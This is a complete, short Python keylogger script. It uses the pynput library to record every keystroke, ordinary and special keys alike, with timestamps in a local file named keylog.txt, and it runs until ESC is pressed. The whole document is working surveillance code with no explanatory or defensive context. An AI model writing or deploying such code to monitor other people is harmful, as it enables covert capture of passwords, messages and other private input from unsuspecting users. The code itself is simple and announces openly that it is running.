from pynput.keyboard import Key, Listener
import logging

# File to store keystrokes
log_file = "keylog.txt"

# Logging setup
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to log keystrokes
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key: {key}")

# Stop logging on ESC
def on_release(key):
    if key == Key.esc:
        print("Keylogger stopped.")
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger is running... (press ESC to stop)")
    listener.join()
